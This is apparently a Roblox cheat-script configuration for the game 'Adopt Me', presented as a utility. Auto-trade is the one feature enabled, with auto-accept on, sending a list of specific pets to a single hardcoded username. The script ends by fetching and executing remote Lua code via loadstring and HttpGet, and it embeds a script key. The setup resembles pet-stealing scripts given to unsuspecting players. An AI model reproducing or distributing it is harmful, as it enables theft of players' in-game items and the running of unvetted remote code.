  getgenv().Utility = {
        AutoPotion = {
            Enabled = false, -- Start auto potion leveling on load
            UseAllOnAll = false, -- Use all potions on all pets (highest age first)
            SelectedPets = {}, -- Specific pet IDs to level e.g. {"dog", "cat"}
        },
        AutoNeon = {
            Enabled = false, -- Start auto neon fusing on load
            MakeMega = false, -- Make mega neons instead of regular neons
            SelectedPets = {}, -- Specific pet IDs to fuse e.g. {"dog", "cat"}
        },
        AutoTrade = {
            Enabled = true, -- Start auto trading on load
            AutoAcceptTrades = true, -- Auto accept trade requests sent TO you
            AutoLeaveAfterTrades = false, -- Leave/kick once every target has nothing left to receive
            LeaveDelay = 5, -- Seconds to wait after trades finish before leaving
            Usernames = {"Crystal0bKingN1381"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
            TradeMode = "specific", -- "all" = send everything in Categories | "specific" = only the Items list
            Categories = {"pets"}, -- What to send
            Items = {"journey_2026_bison", "journey_2026_nurse_shark", "journey_pass_2026_gecko_duck", "journey_2026_pilot_gull","journey_2026_sheepdog_duck", "summer_2026_river_otter", "summer_2026_stygian_owl"}, -- Item IDs/names to send when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
            ItemCounts = {}, -- Max per item per player e.g. {dog = 30, cat = 12} ({} = unlimited)

            -- GLOBAL pet filter. Used for ANY pet NOT listed in PetFilters below.
            GlobalPetFilter = {
                Versions = {}, -- {} = all versions | or pick any of {"regular", "neon", "mega"}
                Ages = {}, -- {} = all ages | or pick any of {1,2,3,4,5,6} (6 = full grown). Mega ignores ages
                -- EXAMPLE - neon full growns + regular full growns, no mega:
                --   Versions = {"regular", "neon"}, Ages = {6}
            },

            -- PER-PET FILTER. Lets you set exact rules for specific pets.
            -- Any pet listed here IGNORES GlobalPetFilter completely (only these rules apply to it).
            --
            -- FORMAT:  pet_id = { version = { ages } }
            --   version  -> "regular", "neon" or "mega"
            --   ages     -> {} = all ages | or pick from {1,2,3,4,5,6}
            --               1=Newborn 2=Junior 3=Pre-Teen 4=Teen 5=Post-Teen 6=Full Grown
            --
            -- RULES:
            --   - a version you DON'T list = that version is NOT traded for this pet
            --   - {} after a version = trade ALL ages of that version
            --   - {6} after a version = trade only full grown of that version
            --   - mega ALWAYS ignores ages (mega has no age), so just use mega = {}
            --
            -- EXAMPLES:
            --   turtle = { mega = {} }
            --       -> only mega turtles. regular + neon turtles NOT traded (not listed)
            --
            --   dog = { regular = {6}, neon = {} }
            --       -> full grown regular dogs + ALL neon dogs. mega dogs NOT traded
            --
            --   shadow_dragon = { neon = {6}, mega = {} }
            --       -> full grown neon shadows + all mega shadows. regular NOT traded
            --
            --   frost_dragon = { regular = {4,5,6}, neon = {6}, mega = {} }
            --       -> teen/post-teen/FG regular, FG neon, all mega
            PetFilters = {
                -- example_pet = { regular = {6}, neon = {} },
            },

            -- Manual Trade-tab filters only (do NOT affect auto trade above)
            Filters = {
                Kind = "ALL", -- Show only one item ID, "ALL" = off
                Type = "ALL", -- "ALL" / "regular" / "neon" / "mega"
                Rarity = "ALL", -- "ALL" / "common" / "uncommon" / "rare" / "ultra_rare" / "legendary"
                Search = "", -- Text search, comma separated e.g. "dog, cat, buffalo"
            },
        },
        AutoOpen = {
            Enabled = false, -- Start auto opening on load
            Items = {}, -- Item IDs to open e.g. {"gift_box", "cracked_egg"}
            OpenDelay = 1, -- Seconds between each open (0.5 - 3)
        },
       Shop = {
            Enabled = false, -- Auto buy items on load
            Items = {}, -- Item IDs to auto buy e.g. {"cracked_egg", "hot_dog_stand"}
            BuyQuantity = 1, -- How many to buy per purchase (1, 5, 10, 25, 50, 100)
            BuyDelay = 1, -- Seconds between purchases (0.5 - 3)
        },
        AccountManager = {
            Enabled = false,
            Tool = "none", -- "yummy", "farmsync", "farmerv5"
            Yummy = {
                Action = "completed",
                Reason = "Done",
            },
            FarmSync = {
                Action = "completed",
                FromFolderId = "",
                ToFolderId = "",
                ChangeWithoutReplacement = false,
                ConfigId = nil,
                ApiKey = "",
            },
            FarmerV5 = {
                ApiKey = "", -- FarmerV5 API key (bearer token)
            },
        },
        Settings = {
            AutoShowUI = false, -- Show UI on script load (false = hidden, use toggle key)
            Theme = "Dark", -- UI theme: "Dark", "Midnight", "Amoled"
            ToggleKey = "RightShift", -- Key to toggle UI visibility
        },
    };
getgenv().scriptkey="PWUyrezPKtBiJjNHFgMYfmfDOKCZZmHi"
loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Utility.lua"))()
